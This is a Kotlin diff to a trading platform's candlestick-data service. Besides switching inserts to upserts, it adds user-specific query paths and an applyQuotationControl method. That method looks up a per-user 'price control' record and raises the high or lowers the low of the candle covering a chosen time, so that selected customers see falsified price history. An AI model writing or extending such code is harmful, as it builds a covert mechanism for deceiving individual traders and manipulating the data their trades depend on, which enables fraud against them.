@@ -1,9 +1,11 @@
 package com.fund.modules.kline.service.impl
 
+import com.fund.common.enums.KlineEnum
 import com.fund.modules.kline.model.Kline
 import com.fund.modules.kline.service.KlineService
 import com.fund.modules.kline.util.KlineAggregator
 import com.fund.modules.kline.util.KlineRedisManager
+import com.fund.modules.quotation.service.UserQuotationControlService
 import com.fund.modules.stock.model.Stock
 import mu.KotlinLogging
 import org.springframework.beans.factory.annotation.Autowired
@@ -11,6 +13,7 @@ import org.springframework.data.domain.Sort
 import org.springframework.data.mongodb.core.MongoTemplate
 import org.springframework.data.mongodb.core.query.Criteria
 import org.springframework.data.mongodb.core.query.Query
+import org.springframework.data.mongodb.core.query.Update
 import org.springframework.stereotype.Service
 import java.math.BigDecimal
 
@@ -20,7 +23,8 @@ import java.math.BigDecimal
 @Service
 class KlineServiceImpl @Autowired constructor(
     private val mongoTemplate: MongoTemplate,
-    private val klineRedisManager: KlineRedisManager
+    private val klineRedisManager: KlineRedisManager,
+    private val quotationControlService: UserQuotationControlService
 ) : KlineService {
 
     private val logger = KotlinLogging.logger {}
@@ -30,10 +34,26 @@ class KlineServiceImpl @Autowired constructor(
             if (klines.isEmpty()) {
                 return
             }
-
             for (kline in klines) {
                 val collectionName = "Kline_${kline.market}_${kline.symbol}_${kline.interval}"
-                mongoTemplate.insert(kline, collectionName)
+                // 根据 id 查询，存在则更新，不存在则新增
+                val query = Query(Criteria.where("id").`is`(kline.id))
+                // 计算 endTime = timestamp + intervalTime (秒)
+                val intervalTime = KlineEnum.fromInterval(kline.interval)?.intervalTime ?: 60L
+                val endTime = kline.timestamp + intervalTime
+                val update = Update()
+                    .set("open", kline.open)
+                    .set("high", kline.high)
+                    .set("low", kline.low)
+                    .set("close", kline.close)
+                    .set("volume", kline.volume)
+                    .set("createTime", kline.createTime)
+                    .set("timestamp", kline.timestamp)
+                    .set("endTime", endTime)
+                    .setOnInsert("symbol", kline.symbol)
+                    .setOnInsert("market", kline.market)
+                    .setOnInsert("interval", kline.interval)
+                mongoTemplate.upsert(query, update, collectionName)
             }
         } catch (e: Exception) {
             logger.error(e) { "Error saving kline data" }
@@ -46,14 +66,24 @@ class KlineServiceImpl @Autowired constructor(
         interval: String, 
         limit: Int
     ): List<Kline> {
+        return getKlinesBySymbolForUser(symbol, market, interval, limit, null)
+    }
+
+    override fun getKlinesBySymbolForUser(
+        symbol: String,
+        market: String,
+        interval: String,
+        limit: Int,
+        userId: Long?
+    ): List<Kline> {
         try {
             val collectionName = "Kline_${market}_${symbol}_${interval}"
             val query = Query()
                 .with(Sort.by(Sort.Direction.DESC, "timestamp"))
                 .limit(limit)
-            
-            return mongoTemplate.find(query, Kline::class.java, collectionName)
-            
+            val klines = mongoTemplate.find(query, Kline::class.java, collectionName)
+            // 如果有用户ID，应用价格调控
+            return applyQuotationControl(klines, symbol, market, userId)
         } catch (e: Exception) {
             logger.error(e) { "Error getting klines for $symbol-$market-$interval" }
             return emptyList()
@@ -67,18 +97,55 @@ class KlineServiceImpl @Autowired constructor(
         startTime: Long,
         endTime: Long
     ): List<Kline> {
+        return getKlinesByTimeRangeForUser(symbol, market, interval, startTime, endTime, null)
+    }
+
+    override fun getKlinesByTimeRangeForUser(
+        symbol: String,
+        market: String,
+        interval: String,
+        startTime: Long,
+        endTime: Long,
+        userId: Long?
+    ): List<Kline> {
         try {
             val collectionName = "Kline_${market}_${symbol}_${interval}"
             val query = Query(
                 Criteria.where("timestamp").gte(startTime).lte(endTime)
-            )
-                .with(Sort.by(Sort.Direction.ASC, "timestamp"))
-            
-            return mongoTemplate.find(query, Kline::class.java, collectionName)
-            
+            ).with(Sort.by(Sort.Direction.ASC, "timestamp"))
+            val klines = mongoTemplate.find(query, Kline::class.java, collectionName)
+            return applyQuotationControl(klines, symbol, market, userId)
         } catch (e: Exception) {
             logger.error(e) { "Error getting klines by time range for $symbol-$market-$interval" }
             return emptyList()
+        }
+    }
+
+    /**
+     * 根据用户调控配置调整K线价格
+     * effectTime 落在 [timestamp, endTime) 范围内才修改
+     * floating > 0 修改 high，floating < 0 修改 low
+     */
+    private fun applyQuotationControl(klines: List<Kline>, symbol: String, market: String, userId: Long?): List<Kline> {
+        if (userId == null || klines.isEmpty()) return klines
+        val control = quotationControlService.getActiveControl(userId, symbol, market) ?: return klines
+        val floating = control.floating ?: return klines
+        val effectTime = control.effectTime ?: return klines
+        if (floating == BigDecimal.ZERO) return klines
+        
+        return klines.map { kline ->
+            // 判断 effectTime 是否在 [timestamp, endTime) 范围内
+            if (effectTime >= kline.timestamp && effectTime < kline.endTime) {
+                if (floating > BigDecimal.ZERO) {
+                    // 正数修改 high
+                    kline.copy(high = kline.high.add(floating))
+                } else {
+                    // 负数修改 low
+                    kline.copy(low = kline.low.add(floating))
+                }
+            } else {
+                kline
+            }
         }
     }
 
